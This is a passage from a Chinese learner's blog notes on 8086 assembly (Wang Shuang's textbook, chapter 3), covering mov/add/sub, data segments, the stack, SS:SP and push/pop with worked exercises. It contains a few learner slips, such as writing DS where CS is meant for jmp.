class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,bx ==&gt;寄存器寻址 </span><br><span class="line">mov ax,1000H  ==&gt;立即寻址</span><br><span class="line">mov ax,[0]  ==&gt;直接寻址</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在修改DS段寄存器中的内容的时候是：利用了通用寄存器结合mov实现的</span><br><span class="line"></span><br><span class="line">但是修改CS段的寄存器的时候是直接使用jmp命令修改的</span><br><span class="line">jmp DS:IP  --&gt; 这个就是DS和IP一起修改</span><br><span class="line">jmp ax--&gt;这个就是DS不变，IP变成AX寄存器中的值</span><br></pre></td></tr></table></figure><p>6.写几条指令，将al中的数据送入内存单元10000H？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov BX,1000H</span><br><span class="line">mov DS,BX</span><br><span class="line">mov [0],AL</span><br><span class="line">这里是把数据放入某单元</span><br></pre></td></tr></table></figure><h2 id="3-3字的传送"><a href="#3-3字的传送" class="headerlink" title="3.3字的传送"></a>3.3字的传送</h2><p>1.因为8086CPU是16位结构，有16根数据线，所以一次性传入16位的数据，也就是一次性传送一个字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">比如：</span><br><span class="line">mov bx,1000H</span><br><span class="line">mov ds,bx  //前面俩个是为了确定段地址</span><br><span class="line">mov ax,[0]//1000:0处的字型数据送入ax中</span><br><span class="line">mov [],cx//cx中16位数据送到1000:0处</span><br></pre></td></tr></table></figure><h3 id="小结一下【实验】P14"><a href="#小结一下【实验】P14" class="headerlink" title="小结一下【实验】P14"></a>小结一下【实验】P14</h3><p>首先CS:IP 和 DS[偏移地址]是密不可分的【好像有点奇怪，现在姑且这样理解】</p><p>CS:IP确定了指向命令的地址 【在我看来就是地址总线】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">好像也不是很对，emmmm，反正就是说在CS:IP的地址中的内容可以放入命令，然后进行执行</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">首先在地址中写入要执行命令的汇编指令，</span><br><span class="line">然后用CS:IP指向这些地址，在运行的时候，这些地址里面的内容就会指向命令</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230406160947921.png" alt="image-20230406160947921"></p><p>通过运行CS:IP地址中的内容就可以去改变DS中的内容，然后读取DS地址中的内容放入或者运算入AX BX CX DX通用寄存器中</p><p>DS确定了读取数据的地址 【在我看来就是数据总线】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">反正就是说运行的命令，都是在CS:IP地址中的内容，如果CS:IP中的某些命令需要用到DS，则就会去调用DS[]地址中的值。</span><br><span class="line">差不多就是这个意思</span><br></pre></td></tr></table></figure><p>当通用寄存器用的是X的时候【16位的时候】就需要把该地址和该地址+1的内容当作字来看</p><p>但是如果使用的是L/H的时候，就需要当作字节来看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">因为，这个传入的内容不能大于放入的寄存器</span><br><span class="line">mov ax,[0]//这样就是当作字来看，因为ax寄存器中可以存16位【一个字】</span><br><span class="line">mov al,[0]//这样就要当作字节来看，因为al寄存器中只能放入8位【一个字节】</span><br><span class="line"></span><br><span class="line">寄存器有多大，就放多少，在选中的该地址往后加就好了</span><br><span class="line">以寄存器为标准，内存按照寄存器的大小对寄存器放入值</span><br></pre></td></tr></table></figure><h2 id="3-4mov-add-sub指令"><a href="#3-4mov-add-sub指令" class="headerlink" title="3.4mov,add, sub指令"></a>3.4mov,add, sub指令</h2><p>1.mov</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">已知：</span><br><span class="line">mov 寄存器，数据</span><br><span class="line">mov ax,100</span><br><span class="line">mov 寄存器，寄存器</span><br><span class="line">mov ax,bx</span><br><span class="line">mov 寄存器，内存单元 //内存单元这里就是DS[address]指向的位置</span><br><span class="line">mov ax,[0]</span><br><span class="line">mov 内存单元，寄存器</span><br><span class="line">mov [0],ax</span><br><span class="line">mov 段寄存器，寄存器</span><br><span class="line">mov ds,ax</span><br><span class="line">新的：</span><br><span class="line">mov 寄存器，段寄存器</span><br><span class="line">mov ax,ds</span><br></pre></td></tr></table></figure><p> 2.add【➕】和sub【➖】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add 寄存器，数据</span><br><span class="line">add ax，3</span><br><span class="line">add 寄存器，寄存器</span><br><span class="line">add ax，bx</span><br><span class="line">add 寄存器，内存单元</span><br><span class="line">add ax，[0]</span><br><span class="line">add 内存单元，寄存器</span><br><span class="line">add [0]，ax</span><br><span class="line">注意：！！！</span><br><span class="line">add不能对段寄存器进行操作</span><br><span class="line">比如：add ds，ax  ==&gt;  这样是错误的！！【段寄存器不是这么用的，所以没有设置这个功能】</span><br><span class="line"></span><br><span class="line">##然后sub和add完全一样</span><br></pre></td></tr></table></figure><h2 id="3-5数据段"><a href="#3-5数据段" class="headerlink" title="3.5数据段"></a>3.5数据段</h2><p>1.前面讲过，对于8086PC机，我们可以根据需要将一组内存单元定义为一个段（这个段，可以是代码段，也可以是数据段）</p><p>2.我们可以将一组长度为N(N&lt;=64K)，地址连续，起始地址是16的倍数的内存单元当作专门存储数据的内存空间，这个空间就是定义的数据段</p><p>3.比如我们用123BOH~123B9H这段空间来存放数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">段地址：123BH  ==&gt;这里会经过加工厂*16=123BOH</span><br><span class="line">长度是10字节【123B0~123B9有10个存储单元【一个存储单元就是1B】】</span><br></pre></td></tr></table></figure><p>4.如何访问你数据段的中数据？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">题目1：我们将123BOH~123BAH的内存单元定义为数据段，我们现在要累加这个数据段中的前3个单元中的数据</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">解：</span><br><span class="line">mov ax,123BH</span><br><span class="line">mov ds,ax</span><br><span class="line">mov al,0//因为数题目是前三个单元中的数据，每一个存储单元的大小是1B也就是8位，所以这里需要使用低位的al 而不是 使用ax，如果使用ax的话，就会把数据放入字中【16位】这样所求得的就不是前三个单元中的数据的累加，而是前三个字中数据的累加</span><br><span class="line">add al,[0]//计算机都是从0开始哦</span><br><span class="line">add al,[1]</span><br><span class="line">add al,[2]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">题目2：我们将123BOH~123BAH的内存单元定义为数据段，我们现在要累加这个数据段中的前3个字型中的数据</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这里就是把al改成ax就好啦，当然偏移地址也要累加2【懂的都懂，不懂的就别学了】</span><br><span class="line">add ax,[0]//为了放入ax中其实这里是[0]放入低位[1]放入高</span><br><span class="line">add ax,[2]</span><br><span class="line">add ax,[4] </span><br><span class="line">注意：一个字型数据占2个单元，所以偏移地址是0，2，4</span><br></pre></td></tr></table></figure><h3 id="3-1-3-5小结一下"><a href="#3-1-3-5小结一下" class="headerlink" title="3.1~3.5小结一下"></a>3.1~3.5小结一下</h3><p>1**.字在内存中存储的时候，要用俩个地址连续的内存单元来存放，字的低位字节【al】存放在低地址单元【0】中，高位字节【ah】存放在高地址单元【1】中</p><p>2.用mov指令要访问内存单元，可以在mov指令中只给处单元的偏移地址，此时，段地址默认在DS寄存器中</p><p>3.[address]表示一个偏移地址位address的内存单元</p><p>4.在内存和寄存器之间传送字型数据时，高地址单元和高8位寄存器，低地址单元和低8位寄存器相对应</p><p>5.mov add sub 是具有两个操作对象的指令。jmp是具有一个操作对象的指令</p><p>6.可以根据自己的推测，在debug中实验指令的新格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">根据弹幕： mov ax,1000:[0]  ==&gt;  这样不error的【我也不确定】</span><br></pre></td></tr></table></figure><h2 id="3-6栈"><a href="#3-6栈" class="headerlink" title="3.6栈"></a>3.6栈</h2><p>1.我们研究栈的角度：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">首先：栈是内存空间的一部分</span><br><span class="line"></span><br><span class="line">栈是一种具有特殊的访问方式的存储空间，它的特殊性就在于，最后进入这个空间的数据，最先出去【迟到早退】</span><br></pre></td></tr></table></figure><p>2.栈有俩个基本的操作：入栈和出栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">入栈：将一个新的元素放到栈顶</span><br><span class="line">出栈：从栈顶取出一个元素</span><br></pre></td></tr></table></figure><p>3.栈顶的元素总是最后入栈，需要出栈的时候，又是最先被从栈中取出</p><p>4.栈的操作规则：LIFO</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Last In First Out</span><br><span class="line">后进先出</span><br></pre></td></tr></table></figure><h2 id="3-7CPU提供的栈机制"><a href="#3-7CPU提供的栈机制" class="headerlink" title="3.7CPU提供的栈机制"></a>3.7CPU提供的栈机制</h2><p>1.如今的CPU中都有栈的设计</p><p>2.8086CPU提供相关的指令来以栈的方式访问内存空间</p><p>3.这意味着，我们在基于8086CPU编程的时候，可以将一段内存当作栈来使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">只是我们当作栈来使用，sb计算机只会0和1</span><br></pre></td></tr></table></figure><p>4.8086CPU提供入栈和出栈指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">最基本：</span><br><span class="line">PUSH:（入栈）【入就入到最底部】</span><br><span class="line">POP（出栈）【出就是从顶部出】</span><br><span class="line">push ax：将寄存器ax中的数据送入栈中</span><br><span class="line">pop ax：从栈顶取出数据放入ax</span><br></pre></td></tr></table></figure><p>5.8086CPU的入栈和出栈操作都是以字【16位】为单位进行【这个是因为8086CPU内部是以16位为单位运算的，现在都是32/64位咯】</p><p>6.CPU如何知道一段内存空间被当作栈使用？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">首先我们知道</span><br><span class="line">段寄存器CI:IP所指向的就是指令</span><br><span class="line">段寄存器DS所指向的就是数据</span><br><span class="line">所以，以此类推，肯定有一个栈寄存器</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在8086CPU中，有俩个寄存器：</span><br><span class="line">段寄存器SS ：存放栈顶的段地址</span><br><span class="line">寄存器SP : 存放栈顶的偏移地址</span><br><span class="line">任意时刻，SS:SP指向栈顶元素</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里我们要注意的是：栈顶不是某个栈的顶部，而是某栈存放了数据，然后栈顶就是最后放入数据的位置</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230406173524469.png" alt="image-20230406173524469"></p><p>7.在执行PUSH和POP的时候，如何知道那个单元是栈顶单元</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在指向PUSH和POP的时候，栈顶的位置是动态变化的，那么它是如何知道的呢？</span><br></pre></td></tr></table></figure><h3 id="push-ax"><a href="#push-ax" class="headerlink" title="push ax"></a>push ax</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这个步骤在计算机中其实是两步</span><br><span class="line">1.SP=SP-2//这里是-2而不是+2的原因是：在push的时候，数据会首先放入栈的最底部【也就是偏移地址最大的时候，高地址】</span><br><span class="line">//这个就类似于IP=IP+所读指令长度</span><br><span class="line">2.将ax中的内容送入SS:SP指向的内存单元出【字】，SS:SP此时指向新栈顶</span><br></pre></td></tr></table></figure><h3 id="pop-ax"><a href="#pop-ax" class="headerlink" title="pop ax"></a>pop ax</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">就是push的逆运算</span><br><span class="line">1.将SS:SP指向的字中的内容放入ax后</span><br><span class="line">2.SP=SP+2</span><br><span class="line"></span><br><span class="line">在使用POP之后，取出来原来地址上的内容还是存在的，【可以理解成，SP变了，只是把内容copy出去了】</span><br><span class="line">内存中的数据是不会被删除，只能一次一次的被覆盖被覆盖</span><br></pre></td></tr></table></figure><p>8.问题：如果我们将10000H~1000FH这段空间当作栈，初始状态栈是空的，此时SS=1000H,那SP=？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">当然是不是000FH啦</span><br><span class="line">**是最高单元的下一个地址</span><br><span class="line">SP=0010</span><br><span class="line">因为只有指向最高单元的下一个地址</span><br><span class="line">在push 的时候，整出俩个地址才会对应上哦</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230406201341990.png" alt="image-20230406201341990"></p><p>换个角度看看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.任何时刻，SS:SP指向栈顶元素，当栈为空的时候，栈中没有元素，也就步存在栈顶元素</span><br><span class="line">2.所以在栈为空的时候，SS:SP就只能指向栈的最底部单元下面的单元，该单元的偏移地址为栈最底部的字单元的偏移地址+2【这里是字单元，如过是字节的话，就是+1】</span><br><span class="line">3.栈最底部子单元地址是1000:000E,所以栈为空的时候，SP=0010H</span><br></pre></td></tr></table></figure><h2 id="3-8栈顶超界的问题"><a href="#3-8栈顶超界的问题" class="headerlink" title="3.8栈顶超界的问题"></a>3.8栈顶超界的问题</h2><p>1.SS和SP只记录了栈顶的地址，依靠SS和SP可以保证在入栈和出栈的时候找到栈顶。</p><p>2.但是，如何能够保证在入栈和出栈的时候，栈顶不会超出栈空间</p><p>3.当栈满的时候在使用PUSH指令入栈，栈空的时候在使用POP指令出栈，都会发生栈顶出界的问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">哟~出现了溢出</span><br><span class="line">向上的溢出--push</span><br><span class="line">向下的溢出--pop</span><br></pre></td></tr></table></figure><p>4.栈顶越界是危险的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">因为我们既然将一段空间安排为栈，那么在占空间之外的空间里面很可能存放了具有其他用途的数据，代码。这些数据，代码可能是我们自己程序中的，也可能是贝格程序中的（毕竟一个计算机系统并不是只有我们自己程序在运行）</span><br><span class="line"></span><br><span class="line">相当于在溢出的时候，可以用PUSH或POP把栈之外的内容给搞出来，然后就会出现一些泄露或者，覆盖掉其他的东西。【类似吧】</span><br></pre></td></tr></table></figure><p>5.但是由于我们在入栈和出栈时候的不小心（故意）加上一些其他工具【乱说的，可能可以把这些内容收集起来，就可以无限可能】</p><p>6.8086CPU不保证对栈的操作不会越界</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">8086CPU只知道栈顶在何处</span><br><span class="line">因为栈的大小是我们自己定义的，CPU不知道我们定义了多大，不知上线和下线，所以CPU就会很SB的以为还在栈里面【但是这个时候已经跑出去了】</span><br><span class="line">CPU只知道要执行的栈顶在何处，但是不知道要栈空间的大小是多少</span><br></pre></td></tr></table></figure><p>7.总的一句话，我要想办法使他溢出【哈哈】</p><h2 id="3-9PUSH和POP指令"><a href="#3-9PUSH和POP指令" class="headerlink" title="3.9PUSH和POP指令"></a>3.9PUSH和POP指令</h2><p>1.首先PUSH和POP是可以在寄存器和内存之间传送数据的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.栈空间是内存空间的一部分，它只是一段可以以一种特殊的方式进行访问的内存空间</span><br></pre></td></tr></table></figure><p>2.看看POP和PUSH指令的格式把</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">通用寄存器：</span><br><span class="line">1.PUSH 寄存器：将一个寄存器中的数据入栈</span><br><span class="line">2.POP 寄存器：出栈，用一个寄存器接受出栈的数据</span><br><span class="line">段寄存器：</span><br><span class="line"> 1.PUSH 段寄存器：将一个段寄存器中的数据入栈</span><br><span class="line"> 2.POP 段寄存器：出栈，用一个段寄存器接受出栈的数据</span><br><span class="line"> 【也就是说，PUSH和POP可以对段寄存器使用】</span><br><span class="line"> 【补充，ADD和SUB不能对段寄存器使用】</span><br><span class="line">内存单元：</span><br><span class="line">1.PUSH 内存单元：将一个内存单元处的字入栈（栈操作都是以字为单位）</span><br><span class="line">2.POP内存单元：出栈，用一个内存字单元接收出栈的数据</span><br><span class="line">PUSH [0] //字型的数据</span><br><span class="line">POP [2]</span><br><span class="line"></span><br><span class="line">指令执行的时候，CPU要知道内存单元的地址，可以在PUSH POP 指令中给处内存单元的偏移地址，段地址在指令执行的时候,CPU从DS取得</span><br><span class="line"></span><br><span class="line">数据的段地址在ds中获得   用[]来偏移地址</span><br><span class="line">代码的段地址在cs中获得   用ip来偏移地址</span><br><span class="line">栈的段地址在ss中获得    用sp来偏移地址</span><br></pre></td></tr></table></figure><h3 id="问题1："><a href="#问题1：" class="headerlink" title="问题1："></a>问题1：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">编程将10000H~1000FH这段空间当作栈，初始状态是空的，将AX,BX,DS中的数据入栈</span><br><span class="line">入栈就是push</span><br></pre></td></tr></table></figure><p> 解答</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.mov ax,1000H</span><br><span class="line"></span><br><span class="line">2.mov ss,ax //这里之前说过，段地址不能直接用数据，必须得用通用寄存器来过度。所以这里先把1000H存入ax，后放入ss</span><br><span class="line"></span><br><span class="line">3.mov sp,0010H //这个sp不是段寄存器，段寄存器【CS,DS,SS,ES】.这里为什么是0010H呢？因为栈是到1000FH所以要指向这个的下一个</span><br><span class="line"></span><br><span class="line">4.push ax</span><br><span class="line">5.push bx</span><br><span class="line">6.push ds</span><br></pre></td></tr></table></figure><h3 id="问题2："><a href="#问题2：" class="headerlink" title="问题2："></a>问题2：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.将10000H~1000FH这段空间当作栈，初始状态是空的</span><br><span class="line">2.设置AX=001AH,BX=001BH</span><br><span class="line">3.将AX BX 中的数据入栈</span><br><span class="line">4.然后将AX BX 清零</span><br><span class="line">5.从栈中恢复AX BX 原来的内容</span><br></pre></td></tr></table></figure><p>解答：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这个很简单啦，要注意的是</span><br><span class="line">最后进入的最先出来的</span><br><span class="line">清零是</span><br><span class="line">sub ax,ax或者mov ax,0 或者xor ax,ax[这个是异或]</span><br></pre></td></tr></table></figure><h3 id="问题3"><a href="#问题3" class="headerlink" title="问题3"></a>问题3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.将10000H~1000FH这段空间当作栈，初始状态是空的</span><br><span class="line">2.设置AX=002AH,BX=002BX</span><br><span class="line">3.利用栈，交换AX和BX中的数据</span><br></pre></td></tr></table></figure><p>解答</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push ax</span><br><span class="line">push bx</span><br><span class="line">pop ax //把原来bx的值放入ax</span><br><span class="line">pop bx //把原来ax的值放入bx</span><br></pre></td></tr></table></figure><h3 id="问题4"><a href="#问题4" class="headerlink" title="问题4"></a>问题4</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">如果要在10000H处写入字型数据2266H这么搞？</span><br><span class="line">mov ax,1000H</span><br><span class="line">mov ds,ax // 这步就是要让ds段寄存器指向1000H</span><br><span class="line">mov ax,2266H</span><br><span class="line">mov [0],ax //把2266H的值放入10000H</span><br><span class="line">相当于100000H是66；100001H是22</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">现在进阶</span><br><span class="line">1.________</span><br><span class="line">2.________</span><br><span class="line">3.________</span><br><span class="line">mov ax,2266H</span><br><span class="line">push ax</span><br><span class="line"></span><br><span class="line">完成代码，实现上诉的结果</span><br></pre></td></tr></table></figure><p>解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">分析一波，我们看哈，最后俩个是：</span><br><span class="line">mov ax,2266H</span><br><span class="line">push ax</span><br><span class="line">读一下：这里是把2266H放入ax寄存器中，然后通过栈的PUSH把ax寄存器中的内容push进10000H处</span><br><span class="line">所以：我们需要在这个之前需要把栈的指针指向10000H处</span><br><span class="line">所以:</span><br><span class="line">1.mov ax,1000H</span><br><span class="line">2.mov ss,ax</span><br><span class="line">3.mov sp,2  //这里要想明白：sp的步骤是什么先-2后入栈，这里后面push ax,指针是在10002H的位置，然后push ax 也就是说在10001H的位置会存入22，10000H的位置会存入66</span><br><span class="line"></span><br><span class="line">这个指针是sp-2是往上【低】走</span><br></pre></td></tr></table></figure><p>总的分析：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">我想问一下:我这样的分析是不是对的</span><br><span class="line">mov ax,1000H</span><br><span class="line">mov ds,ax</span><br><span class="line">mov ax,2266H</span><br><span class="line">mov [0],ax</span><br><span class="line"></span><br><span class="line">如果cpu运行了这段命令，然后在地址10000H处和10001H处10002H处的内容是什么？</span><br><span class="line">【我本身想实验的，但是在win11下没有debuf，然后虚拟机我没有下xp，由于急于想知道答案所以没有下】【附加上我不知道还有什么调试器可以用-目前只知道debug】</span><br><span class="line">我感觉像是：，然后在10000H中存入的是66 在10001H中是22</span><br><span class="line">【因为电子书--王爽的汇编在3.1~3.5的小结里面有字在内存中存储的时候，需要用2个连续的内存单元来存放，字的低位字节存放在低地址中[这里我认为是al]高位字节放入高地址中[这个我认为是ah]】</span><br><span class="line"></span><br><span class="line">然后在3.9中的问题3.10中有一个</span><br><span class="line"></span><br><span class="line">mov ax,1000H</span><br><span class="line">mov ss,ax</span><br><span class="line">mov ap,2</span><br><span class="line">mov ax,2266H</span><br><span class="line">push ax</span><br><span class="line">这样的代码是等价于上面的代码【书上这么说的】</span><br><span class="line"></span><br><span class="line">分析这个命令：栈的段地址是1000H，然后偏移地址是0002，所以组合在一起这个地址是10002H</span><br><span class="line">然后在push,ax的时候【这个ax里面是2266】</span><br><span class="line">在高地址中存入的是22【10001H】低地址存入的是66【10000H】</span><br></pre></td></tr></table></figure><h3 id="问题得出的结论"><a href="#问题得出的结论" class="headerlink" title="问题得出的结论"></a>问题得出的结论</h3><p>1.PUSH和POP实质上是一种内存传送指令，可以在寄存器和内存之间传送数据，和mov指令不同的是，push和pop指令访问的内存单元的地址不是在指令中给出的，而是由SS:SP指出的</p><p>2.同时，push和pop指令还会改变sp的内容</p><h2 id="3-10栈段"><a href="#3-10栈段" class="headerlink" title="3.10栈段"></a>3.10栈段</h2><p>1.段–&gt;就是一组内存单元</p><p>2.我们可以将长度为N(&lt;=64K)的一组地址连续，起始地址为16倍数的内存单元，当作栈来用，从而定义了一个栈段</p><p>3.将内存当作栈段，只是我们在编程时候的一种安排，CPU并不会知道这个空间,CPU只知道SS:SP。</p><h3 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h3><p>如果我们将10000H~1FFFFH这段当作栈段是，初始状态是空的，此时SS=1000H那么SP是多少呢？</p><p>解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">猜测的是:超出了啊不知道了FFFF已经是64KB了</span><br><span class="line"></span><br><span class="line">这里emmm SP=0</span><br></pre></td></tr></table></figure><p>换一个角度看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">任何时刻，SS:SP指向栈顶元素，当栈为空的时候，栈中没有元素，也就不存在栈顶元素，所以SS:SP只能指向栈的最底部单元下面的单元，该单元的偏移地址是栈最底部的字单元的偏移地址+2，栈最底部字单元的地址为1000:FFFE,所以栈空的时候，SP=0000H</span><br></pre></td></tr></table></figure><p> 栈的作用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 